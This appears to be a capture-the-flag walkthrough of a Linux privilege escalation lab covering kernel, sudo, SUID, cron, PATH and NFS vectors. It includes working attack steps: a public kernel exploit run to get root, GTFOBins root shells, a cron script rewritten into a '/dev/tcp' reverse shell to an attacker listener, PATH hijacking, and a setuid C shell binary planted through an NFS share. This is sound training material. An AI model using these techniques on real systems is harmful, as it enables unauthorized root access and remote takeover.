# Privilege Escalation: Kernel Exploits

As the name suggests, the best way to start searching for a kernel exploit is to check the kernel version.

```
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1)) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

$ uname -a 
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

From this output we can see that the kernel version is:

3.13.0-24-generic

After searching, I found that this version has a public vulnerability: CVE-2015-1328.

Exploit available on Exploit-DB:
https://www.exploit-db.com/exploits/37292

I used the code from Exploit-DB to perform the exploitation. However, not every CVE has a public exploit, and sometimes the available code is incomplete or unstable.

```
$ nano exploit.c 
$ ls
exploit.c
$ gcc exploit.c -o exploit  
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)

$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
```

After running the exploit, we successfully gained root privileges.

In this exercise, we are looking for a specific file name. The best way to find it is to use the find command:

```
# find / -name flag1.txt
/home/matt/flag1.txt

# cat /home/matt/flag1.txt
THM-X
```
# Privilege Escalation: Sudo

As the name suggests, let’s check whether the user can use sudo.

```
$ sudo -l
Matching Defaults entries for karen on ip-10-67-179-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-67-179-12:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
```

We can see that the user can run find, less, and nano as root without providing a password (NOPASSWD).

This means we can potentially escalate privileges using GTFOBins.

GTFOBins is a curated list of Unix-like binaries that can be abused to bypass local security restrictions in misconfigured systems.

Using the find binary, we can spawn a root shell:

```
$ sudo find . -exec /bin/sh \; -quit
# find / -name flag2.txt
/home/ubuntu/flag2.txt

# cat /home/ubuntu/flag2.txt
THM-X
```

Because find is executed with sudo, the spawned shell runs with root privileges, allowing us to access restricted files and fully compromise the system.

Misconfigured sudo permissions are one of the most common and easiest privilege escalation vectors in Linux systems.

# Privilege Escalation: SUID

If we don’t have permission to use sudo -l, we can look for SUID binaries instead.
To do that, we can use the following command:

```
find / -type f -perm -04000 -ls 2>/dev/null
```

SUID (Set User ID) is a special permission bit in Unix/Linux systems that makes a program run with the file owner’s privileges instead of the privileges of the user who launched it.

First, we confirm that sudo cannot be used:

```
$ sudo -l
[sudo] password for karen: 
Sorry, user karen may not run sudo on ip-10-65-154-239.
```

Now we search for SUID binaries:

```
$ find / -type f -perm -04000 -ls 2>/dev/null
...
/usr/bin/base64
/usr/bin/su
/usr/bin/mount
...
```

Among the listed binaries, we can see that /usr/bin/base64 has the SUID bit set.

After checking GTFOBins, we can confirm that base64 can be abused to read files with elevated privileges when it has the SUID bit set.

Let’s test access to the restricted file:

```
$ cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied
```

Direct reading is not allowed. However, since base64 runs with root privileges (due to SUID), we can use it to read and decode the file:

```
$ base64 /home/ubuntu/flag3.txt | base64 --decode
THM-X
```

Because the binary executes with the file owner's privileges (root), it allows us to read files that are normally inaccessible.

# Privilege Escalation: Cron Jobs

CRON is a time-based job scheduler in Unix/Linux systems that automatically runs commands or scripts at specified times or intervals.

We can check which files are executed by cron using:

```
cat /etc/crontab
```

Example output:

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```

We can see that /home/karen/backup.sh is executed every minute as root.

If we have write permissions to this file, we can modify it and achieve privilege escalation.

Target script:

```
$ cat /home/karen/backup.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.134.207/6666 0>&1
$ chmod +x /home/karen/backup.sh
```

Here, we modified the script to initiate a reverse shell. Since cron runs it as root every minute, the reverse shell will also execute with root privileges.

Now we start a listener on our attacking machine:

```
$ nc -nvlp 6666
Listening on 0.0.0.0 6666
Connection received on 10.67.141.102 56760
bash: cannot set terminal process group (12509): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-67-141-102:~# cat /home/ubuntu/flag5.txt
cat /home/ubuntu/flag5.txt
THM-X
```

After the cron job executes, we receive a reverse shell as root.

# Privilege Escalation: PATH

PATH is an environment variable in Unix/Linux systems that tells the shell where to look for executable programs when you type a command.

```
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

If a program calls another binary without using an absolute path (e.g., thm instead of /usr/bin/thm), the system will search for it in the directories listed in PATH, from left to right.

To find directories where we have write permissions, we can use:

```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Example output:

```
$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
dev/char
dev/fd
...
home/murdoch
...
tmp
var/tmp
```

We can see that /home/murdoch is writable.

Now we prepend this directory to the PATH variable:

```
$ export PATH=/home/murdoch:$PATH
$ echo $PATH
/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now the system searches /home/murdoch before system directories like /usr/bin.

This means that any command name found in /home/murdoch will be executed first.

Directory contents:

```
$ ls -l
total 24
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
```

We can see that test is a SUID binary owned by root.

Now let’s inspect thm.py:

```
$ cat thm.py
/usr/bin/python3

import os
import sys

try:
    os.system("thm")
except:
    sys.exit()
```

The script calls thm without specifying the full path.
This makes it vulnerable to PATH hijacking.

We now create our own malicious thm file inside /home/murdoch:

```
$ echo "/bin/bash" > thm
$ chmod 777 thm
```

When the SUID-root program executes and calls thm, it will run our malicious file instead of a legitimate system binary.

```
$ ./test
root@ip-10-66-167-91:/home/murdoch# cat /home/matt/flag6.txt
THM-X
```

Because test runs with root privileges and relies on a relative command name, we successfully hijacked execution flow and gained a root shell.

# Privilege Escalation: NFS

NFS (Network File System) is a distributed file system protocol that allows a computer to access files over a network as if they were stored locally.

You can check NFS configuration on the target system like this:

```
$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

You can also enumerate exported shares remotely:

```
[ Oguri ~/Desktop ]$ showmount -e 10.65.164.237 
Export list for 10.65.164.237:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

The critical element for this privilege escalation vector is the no_root_squash option.

By default, NFS maps the remote root user to nfsnobody (this is called root squashing) and strips root privileges.
If no_root_squash is enabled on a writable share, the remote root user keeps root privileges on the mounted filesystem.

This means we can:
- Mount the share locally
- Create a binary with the SUID bit set
- Execute it on the target system to gain root access

Mounting the Remote Share

```
$ sudo mount -o rw 10.65.164.237:/tmp /tmp/ctftmp
```

After mounting, we create a malicious file:

```
[ Oguri /tmp/ctftmp ]$ cat exploit.c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile it statically and set the SUID bit:

```
[ Oguri /tmp/ctftmp ]$ sudo gcc -static exploit.c -o exploit -w
[ Oguri /tmp/ctftmp ]$ sudo chmod +s exploit
```

Because the share has no_root_squash, the SUID root permission is preserved on the target system.
Now on the target:

```
$ cd /tmp
$ ls
exploit
exploit.c
...

$ ./exploit
root@ip-10-65-164-237:/tmp# find / -name flag7.txt
/home/matt/flag7.txt

root@ip-10-65-164-237:/tmp# cat /home/matt/flag7.txt
THM-X
```
